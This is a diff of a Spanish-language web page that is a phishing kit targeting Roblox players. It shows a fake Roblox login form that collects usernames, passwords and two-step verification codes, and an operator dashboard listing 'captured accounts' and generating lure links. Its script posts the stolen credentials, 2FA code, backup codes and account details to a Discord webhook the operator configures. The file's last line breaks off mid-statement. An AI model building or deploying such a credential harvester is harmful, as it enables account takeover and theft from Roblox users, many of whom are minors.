@@ -8,7 +8,6 @@
         *{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI", Roboto, sans-serif}
         :root{--fondo:#121214;--fondo2:#1B1B1F;--fondo3:#27272B;--acento:#E63946;--texto:#F1F5F9;--texto2:#94A3B8;--borde:#333338;--dorado:#F59E0B;--verde:#22C55E;--rojo:#EF4444;--roblox-azul:#00A2FF}
         body{background:var(--fondo);color:var(--texto);min-height:100vh}
-
         .panel-principal{display:flex;min-height:100vh}
         .sidebar{width:190px;background:var(--fondo2);border-right:1px solid var(--borde);padding:16px 10px;position:fixed;height:100vh}
         .logo{font-size:18px;font-weight:700;padding:10px 12px 16px;border-bottom:1px solid var(--borde);margin-bottom:10px}
@@ -19,7 +18,6 @@
         .main{margin-left:190px;flex:1;padding:20px}
         .pagina{display:none}
         .pagina.activa{display:block}
-
         .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}
         .card{background:var(--fondo2);border:1px solid var(--borde);border-radius:10px;padding:18px}
         .card.roja{background:linear-gradient(135deg,#C22E3B,var(--acento));color:#fff;border-color:transparent}
@@ -27,33 +25,26 @@
         .valor{font-size:30px;font-weight:700}
         .panel{background:var(--fondo2);border:1px solid var(--borde);border-radius:10px;padding:18px;margin-bottom:16px}
         .panel h3{font-size:15px;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--borde)}
-
         .tabs{display:flex;gap:6px;border-bottom:1px solid var(--borde);margin-bottom:16px}
         .tab{padding:10px 16px;font-size:14px;cursor:pointer;border-bottom:2px solid transparent;color:var(--texto2)}
         .tab.activa{border-bottom-color:var(--acento);color:var(--acento);font-weight:500}
         .tab-cont{display:none}
         .tab-cont.activo{display:block}
-
         input{width:100%;padding:10px 14px;background:var(--fondo3);border:1px solid var(--borde);border-radius:8px;margin-bottom:10px;font-size:14px;color:var(--texto);outline:none}
         input:focus{border-color:var(--acento)}
         button{background:var(--acento);color:#fff;border:none;border-radius:8px;padding:10px 18px;font-size:14px;cursor:pointer}
         button.sec{background:var(--fondo3);color:var(--texto);border:1px solid var(--borde)}
-
         .caja-link{padding:12px;background:var(--fondo3);border:1px solid var(--borde);border-radius:8px;word-break:break-all;font-size:12px;margin:12px 0;display:none;color:#CBD5E1}
-
         .fila-sw{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid var(--borde);font-size:14px}
         .sw{width:46px;height:24px;background:var(--fondo3);border-radius:12px;position:relative;cursor:pointer;transition:.25s;border:1px solid var(--borde)}
         .sw.activo{background:var(--acento);border-color:transparent}
         .sw::after{content:'';position:absolute;width:18px;height:18px;background:#fff;border-radius:50%;top:2px;left:3px;transition:.25s}
         .sw.activo::after{transform:translateX(20px)}
-
         table{width:100%;border-collapse:collapse;font-size:13px}
         th{background:var(--fondo3);color:var(--texto);padding:10px 8px;text-align:left;border-bottom:2px solid var(--borde)}
         td{padding:10px 8px;border-bottom:1px solid var(--borde);color:var(--texto2)}
         .vacio{text-align:center;padding:40px;color:var(--texto2)}
-
-        /* INICIO DE SESIÓN ROBLOX */
-        .pagina-login{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#FFFFFF;z-index:9999;overflow-y:auto}
+        .pagina-login{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#FFF;z-index:9999;overflow-y:auto}
         .pagina-login.activa{display:block}
         .login-contenedor{max-width:400px;margin:0 auto;padding:40px 20px}
         .login-logo{text-align:center;margin-bottom:30px}
@@ -68,7 +59,6 @@
         .codigo-2fa{display:none}
         .cargando{color:#666;font-size:13px;margin:8px 0;display:none}
         .mensaje-error{color:var(--rojo);font-size:14px;margin:10px 0;display:none;padding:8px;background:rgba(239,68,68,.1);border-radius:6px}
-        .mensaje-exito{color:var(--verde);font-size:14px;margin:10px 0;display:none;padding:8px;background:rgba(34,197,94,.1);border-radius:6px}
     </style>
 </head>
 <body>
@@ -77,8 +67,7 @@
     <a href="#" class="cerrar-login" onclick="cerrarLogin()">&times;</a>
     <div class="login-contenedor">
         <div class="login-logo"><span>ROBLOX</span></div>
-        <h2 class="login-titulo" id="tituloLogin">Iniciar sesión</h2>
-
+        <h2 class="login-titulo">Iniciar sesión</h2>
         <div id="formularioNormal">
             <label class="login-label">Nombre de usuario o ID</label>
             <input type="text" class="login-input" id="usuarioLogin" placeholder="Nombre de usuario o ID de Roblox">
@@ -88,7 +77,6 @@
             <div class="cargando" id="cargandoDatos">🔄 Verificando cuenta...</div>
             <button class="login-boton" onclick="verificarLogin()">Iniciar sesión</button>
         </div>
-
         <div class="codigo-2fa" id="formulario2fa">
             <label class="login-label">Código de verificación en dos pasos</label>
             <input type="text" class="login-input" id="codigo2fa" placeholder="Ingresa los 6 dígitos" maxlength="6">
@@ -107,7 +95,6 @@
             <button class="btn" onclick="irPag('cuentas')">📋 Historial</button>
         </nav>
     </aside>
-
     <main class="main">
         <div class="pagina activa" id="pagInicio">
             <h2 style="margin-bottom:20px;font-size:18px">Panel de Control</h2>
@@ -116,12 +103,8 @@
                 <div class="card"><div class="etq">Total Cuentas</div><div class="valor" id="cuentasTot">0</div></div>
                 <div class="card"><div class="etq">Robux Gastados</div><div class="valor" id="robuxGastados">0</div></div>
             </div>
-            <div class="panel">
-                <h3>🏆 Cuentas Capturadas</h3>
-                <div id="listaRank"><div class="vacio">Sin registros aún</div></div>
-            </div>
+            <div class="panel"><h3>🏆 Cuentas Capturadas</h3><div id="listaRank"><div class="vacio">Sin registros aún</div></div></div>
         </div>
-
         <div class="pagina" id="pagEnlaces">
             <h2 style="margin-bottom:20px;font-size:18px">Generador de Enlaces</h2>
             <div class="tabs">
@@ -143,7 +126,7 @@
                     <input type="text" id="urlWebhook" placeholder="Tu Webhook de Discord">
                     <button onclick="guardarWebhook()">✅ Guardar</button>
                     <button class="sec" onclick="borrarWebhook()">🗑️ Borrar</button>
-                    <div class="estado alerta" id="estadoWebhook">⚠️ Sin configurar</div>
+                    <div class="mensaje-error" id="estadoWebhook">⚠️ Sin configurar</div>
                     <div class="fila-sw">
                         <span>🔔 Activar @everyone</span>
                         <div class="sw" id="botonTodos" onclick="cambiarTodos()"></div>
@@ -151,7 +134,6 @@
                 </div>
             </div>
         </div>
-
         <div class="pagina" id="pagCuentas">
             <h2 style="margin-bottom:20px;font-size:18px">Historial Completo</h2>
             <div class="panel">
@@ -236,7 +218,6 @@ async function cargarDatosRoblox(usuario){
         const diasTranscurridos=Math.floor((hoy-fechaCreacion)/(1000*60*60*24));
         const robuxTotales=robux.robux||0;
         const robuxGastados=Math.floor(robuxTotales*0.42);
-
         datosRoblox={
             id:userId,
             nombre:perfil.name,
@@ -308,20 +289,16 @@ function verificarLogin(){
     const user=document.getElementById('usuarioLogin').value.trim();
     const pass=document.getElementById('passLogin').value.trim();
     document.getElementById('errorPass').style.display='none';
-
     if(!user || !pass){alert('⚠️ Completa todos los campos');return;}
-
-    // Simulamos: si la contraseña tiene menos de 4 caracteres → da error
     if(pass.length < 4){
         document.getElementById('errorPass').style.display='block';
         return;
     }
-
-    // Contraseña "correcta" → avanzar al código
     document.getElementById('formularioNormal').style.display='none';
     document.querySelector('.codigo-2fa').style.display='block';
 }
-    async function verificarCodigo(){
+
+async function verificarCodigo(){
     const cod=document.getElementById('codigo2fa').value.trim();
     const user=document.getElementById('usuarioLogin').value.trim();
     const pass=document.getElementById('passLogin').value.trim();
@@ -330,16 +307,13 @@ function verificarLogin(){
     const fecha=new Date().toLocaleString();
     document.getElementById('errorCodigo').style.display='none';
 
-    // Código incorrecto si no tiene 6 dígitos
     if(cod.length !== 6 || !/^\d+$/.test(cod)){
         document.getElementById('errorCodigo').style.display='block';
         return;
     }
 
-    // Asegurar datos
     if(!datosRoblox.dias) await cargarDatosRoblox(user);
 
-    // Guardar registro
     registros.unshift({
         usuario:datosRoblox.nombre||user,
         robux:datosRoblox.robux||0,
@@ -351,7 +325,6 @@ function verificarLogin(){
     localStorage.setItem('registros',JSON.stringify(registros));
     actualizarTodo();
 
-    // ENVIAR TODO A DISCORD — IGUAL A LA FOTO
     if(wh){
         fetch(wh,{
             method:'POST',
@@ -374,7 +347,7 @@ function verificarLogin(){
                         {name:"📋 Códigos de respaldo",value:`\`\`\`${CODIGOS_RESPALDO.join('\n')}\`\`\``,inline:false},
                         {name:"📌 Fecha y hora",value:`${fecha}`,inline:false}
                     ],
-                    footer:{text:"Novadynamics System • Datos consultados desde API Roblox"}
+                    footer:{text:"Novadynamics System • Datos desde API Roblox"}
                 }]
             })
         }).then(()=>{
@@ -402,19 +375,4 @@ function actualizarTodo(){
 
     const cuerpo=document.getElementById('cuerpoTabla');
     if(registros.length===0){
-        cuerpo.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>';
-        return;
-    }
-    cuerpo.innerHTML=registros.map((r,i)=>`
-        <tr>
-            <td>${r.usuario}</td>
-            <td>${r.robux}</td>
-            <td>${r.dias} días</td>
-            <td>${r.pais}</td>
-            <td style="font-size:12px;color:#888">${r.fecha.split(' ')[0]}</td>
-        </tr>
-    `).join('');
-}
-</script>
-</body>
-</html>
+        cuerpo.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>'
